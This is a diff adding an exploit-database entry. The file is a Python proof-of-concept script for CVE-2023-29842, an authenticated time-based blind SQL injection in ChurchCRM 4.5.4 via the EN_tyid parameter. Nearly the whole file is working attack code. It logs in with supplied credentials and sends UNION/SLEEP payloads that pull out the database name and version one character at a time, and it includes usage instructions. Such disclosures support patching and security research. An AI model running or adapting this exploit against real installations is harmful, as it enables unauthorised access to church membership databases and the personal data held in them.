@@ -1,0 +1,96 @@
+id: 39117
+date: 10/16/2023
+title: ChurchCRM 4.5.4 SQL Injection Exploit
+author: Arvandy
+cves: CVE-2023-29842
+
+# Exploit Title: ChurchCRM 4.5.4 - Authenticated Blind SQL Injection via the EN_tyid
+# Date: 03-05-2023
+# Exploit Author: Arvandy
+# Blog Post: https://github.com/arvandy/CVE/blob/main/CVE-2023-29842/CVE-2023-29842.md
+# Software Link: https://github.com/ChurchCRM/CRM/releases
+# Vendor Homepage: http://churchcrm.io/
+# Version: 4.5.4
+# Tested on: Windows, Linux
+# CVE: CVE-2023-29842
+
+"""
+The endpoint /EditEventTypes.php is vulnerable to Blind SQL Injection (Time-based) via the EN_tyid POST parameter.
+This endpoint can be triggered through the following menu: Events - List Event Types - Edit Event Types - Save Name. 
+The EN_tyid Parameter is taken directly from the user input and passed into the SQL query without any sanitization or input escaping. 
+This allows the attacker to inject malicious Event payloads to execute the malicious SQL query.
+
+This script is created as Proof of Concept to retrieve the database name and version.
+"""
+
+
+import sys, requests
+
+def injection(target, inj_str, session_cookies):    
+    for j in range(32, 126):
+        url = "%s/EditEventTypes.php" % (target)
+        headers = {'Content-Type':'application/x-www-form-urlencoded','Cookie':'CRM-2c90cf299230a50dab55aee824ed9b08='+str(session_cookies)}    
+        data = "EN_tyid=%s&EN_ctid=&newEvtName=NewEvent&Action=NAME&newEvtStartTime=09:30:00&newCountName=" % (inj_str.replace("[CHAR]", str(j)))
+        r = requests.post(url, headers=headers, data=data)
+        res = r.text
+        if (r.elapsed.total_seconds () > 2 ):
+            return j
+    return None
+
+
+def retrieveDBName(session_cookies):   
+    db_name = ""
+    print("(+) Retrieving database name, please wait")
+    for i in range (1,100):
+        injection_str = "1'+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,IF(ASCII(SUBSTRING((SELECT+DATABASE()),%d,1))=[CHAR],SLEEP(2),null)-- -" % i
+        retrieved_value = injection(target, injection_str, session_cookies)
+        if (retrieved_value):
+            sys.stdout.write(chr(retrieved_value))
+            sys.stdout.flush()           
+        else:
+            break
+
+def retrieveDBVersion(session_cookies):   
+    db_version = ""
+    print("(+) Retrieving database version, please wait")
+    for i in range (1,100):
+        injection_str = "1'+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,IF(ASCII(SUBSTRING((SELECT+@@version),%d,1))=[CHAR],SLEEP(2),null)-- -" % i
+        retrieved_value = injection(target, injection_str, session_cookies)
+        if (retrieved_value):
+            sys.stdout.write(chr(retrieved_value))
+            sys.stdout.flush()
+        else:
+            break    
+
+
+def login(target, username, password):
+    target = "%s/session/begin" % (target)
+    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+    data = "User=%s&Password=%s" % (username, password)
+    s = requests.session()
+    r = s.post(target, data = data, headers = headers)
+    return s.cookies.get('CRM-2c90cf299230a50dab55aee824ed9b08')
+
+def main():
+    print("(!) Login to the target application")
+    session_cookies = login(target, username, password)       
+    
+    print("(!) Exploiting the Blind Auth SQL Injection to retrieve database name and versions")
+    retrieveDBName(session_cookies)
+    
+    print("")
+    retrieveDBVersion(session_cookies)
+    
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
+        print("(!) Usage: python3 exploit.py <URL> <username> <password>")
+        print("(!) E.g.,: python3 exploit.py http://192.168.1.100/ChurchCRM user pass")
+        sys.exit(-1)
+
+    target = sys.argv[1]
+    username = sys.argv[2]
+    password = sys.argv[3]
+    
+    main()
+
+#  0day.today [2023-10-18]  #
